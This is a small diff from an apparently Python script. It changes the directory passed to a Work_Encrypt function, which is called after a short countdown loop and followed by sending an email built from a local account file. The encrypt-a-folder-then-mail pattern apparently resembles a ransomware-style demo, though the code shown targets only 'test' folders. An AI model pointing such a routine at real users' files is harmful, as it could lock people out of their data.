@@ -58,7 +58,7 @@ if __name__ == '__main__':
 				time.sleep(1)
 				flag = flag + 1
 				if flag > 4:
-					Work_Encrypt("/home/eliasthunderdog/test")
+					Work_Encrypt("/home/foenix/test")
 					Email = email("./mailViaPython/account.txt")
 					Email.sendMail()
 					break
